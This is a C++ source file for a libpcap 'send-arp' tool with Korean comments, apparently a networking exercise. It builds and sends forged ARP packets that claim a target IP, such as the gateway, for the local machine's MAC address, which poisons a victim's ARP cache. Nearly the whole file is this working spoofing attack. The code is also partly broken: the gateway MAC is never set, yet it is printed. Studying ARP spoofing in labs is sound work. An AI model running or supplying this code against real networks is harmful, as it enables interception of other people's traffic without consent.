#include <pcap.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <ifaddrs.h> // 네트워크 인터페이스 정보를 가져오기 위한 헤더 파일
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int get_wlan_ip(char *ip) {
    struct ifaddrs *ifaddr, *ifa;

    // 네트워크 인터페이스 목록을 가져옴
    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return -1;
    }

    // 네트워크 인터페이스 목록 순회
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;

        // 인터페이스 이름이 "wlan"으로 시작하는지 확인
        if (strncmp(ifa->ifa_name, "wlan", 4) == 0) {
            // AF_INET을 지원하는 인터페이스에서 IP 주소 가져오기
            if (ifa->ifa_addr->sa_family == AF_INET) {
                struct sockaddr_in *sa = (struct sockaddr_in *)ifa->ifa_addr;
                inet_ntop(AF_INET, &(sa->sin_addr), ip, INET_ADDRSTRLEN);

                freeifaddrs(ifaddr); // 메모리 해제
                return 0; // 성공적으로 IP 주소를 찾음
            }
        }
    }

    freeifaddrs(ifaddr); // 메모리 해제
    return -1; // wlan 인터페이스를 찾지 못함
}

int get_wlan_mac(unsigned char *mac) {
    struct ifaddrs *ifaddr, *ifa;

    // 네트워크 인터페이스 목록을 가져옴
    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return -1;
    }

    // 네트워크 인터페이스 목록 순회
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;

        // 인터페이스 이름이 "wlan"으로 시작하는지 확인
        if (strncmp(ifa->ifa_name, "wlan", 4) == 0) {
            int sock = socket(AF_INET, SOCK_DGRAM, 0);
            if (sock == -1) {
                perror("socket");
                freeifaddrs(ifaddr);
                return -1;
            }

            struct ifreq ifr;
            strncpy(ifr.ifr_name, ifa->ifa_name, IFNAMSIZ-1);
            ifr.ifr_name[IFNAMSIZ-1] = '\0';

            if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
                close(sock);
                freeifaddrs(ifaddr); // 메모리 해제
                return 0; // 성공적으로 MAC 주소를 찾음
            } else {
                perror("ioctl");
                close(sock);
            }
        }
    }

    freeifaddrs(ifaddr); // 메모리 해제
    return -1; // wlan 인터페이스를 찾지 못함
}

void get_mac_about_sender_ip(char *iface, char *ip, unsigned char *mac) {
    int sock;
    struct sockaddr_in target;
    struct arpreq req;
    struct ifreq ifr;

    sock = socket(AF_INET, SOCK_DGRAM, 0);

    target.sin_family = AF_INET;
    inet_pton(AF_INET, ip, &target.sin_addr);

    memset(&req, 0, sizeof(req));
    memcpy(&req.arp_pa, &target, sizeof(target));
    strcpy(req.arp_dev, iface);

    if (ioctl(sock, SIOCGARP, &req) == -1) {
        perror("ioctl");
        close(sock);
        exit(1);
    }

    memcpy(mac, req.arp_ha.sa_data, 6);
    close(sock);
}

void get_mac_about_target_ip(const char *iface, unsigned char *mac_address) {
    int sock;
    struct ifreq ifr;

    // 소켓 생성
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    // 네트워크 인터페이스 이름 설정
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    ifr.ifr_name[IFNAMSIZ-1] = '\0';

    // MAC 주소 요청
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        exit(EXIT_FAILURE);
    }

    // MAC 주소 복사
    memcpy(mac_address, ifr.ifr_hwaddr.sa_data, 6);

    // 소켓 종료
    close(sock);
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char iface[] = "wlan0";  
    char gateway_ip[INET_ADDRSTRLEN];
    unsigned char gateway_mac[6];
    unsigned char sender_mac[6];

    char local_ip[INET_ADDRSTRLEN] = {0};  // IP 주소를 저장할 변수
    unsigned char local_mac[6] = {0}; 

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    get_wlan_ip(local_ip);
    get_wlan_mac(local_mac);

    for (int i = 2; i < argc ; i +=2)
    {
        get_mac_about_sender_ip(iface, argv[i], sender_mac);
        // get_mac_about_target_ip(iface, gateway_mac);

        char sender_mac_str[18];
        char target_mac_str[18];
        char local_mac_str[18];

        snprintf(sender_mac_str, sizeof(sender_mac_str), "%02x:%02x:%02x:%02x:%02x:%02x",
                    sender_mac[0], sender_mac[1], sender_mac[2],
                    sender_mac[3], sender_mac[4], sender_mac[5]);

        snprintf(target_mac_str, sizeof(target_mac_str), "%02x:%02x:%02x:%02x:%02x:%02x",
                    gateway_mac[0], gateway_mac[1], gateway_mac[2],
                    gateway_mac[3], gateway_mac[4], gateway_mac[5]);

        snprintf(local_mac_str, sizeof(local_mac_str), "%02x:%02x:%02x:%02x:%02x:%02x",
                    local_mac[0], local_mac[1], local_mac[2],
                    local_mac[3], local_mac[4], local_mac[5]);

        EthArpPacket packet;

        packet.eth_.dmac_ = Mac(sender_mac_str);
        packet.eth_.smac_ = Mac(local_mac_str);    
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Request);
        packet.arp_.smac_ = Mac(local_mac_str);
        packet.arp_.sip_ = htonl(Ip(argv[i+1]));
        packet.arp_.tmac_ = Mac(sender_mac_str);
        packet.arp_.tip_ = htonl(Ip(argv[i]));

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

    }



    printf("SENDER MAC Address of %s: %02x:%02x:%02x:%02x:%02x:%02x\n",
        iface,
        sender_mac[0], sender_mac[1], sender_mac[2],
        sender_mac[3], sender_mac[4], sender_mac[5]);

    printf("TARGET MAC Address of %s: %02x:%02x:%02x:%02x:%02x:%02x\n",
        iface,
        gateway_mac[0], gateway_mac[1], gateway_mac[2],
        gateway_mac[3], gateway_mac[4], gateway_mac[5]);

    pcap_close(handle);
    return 0;
    
}

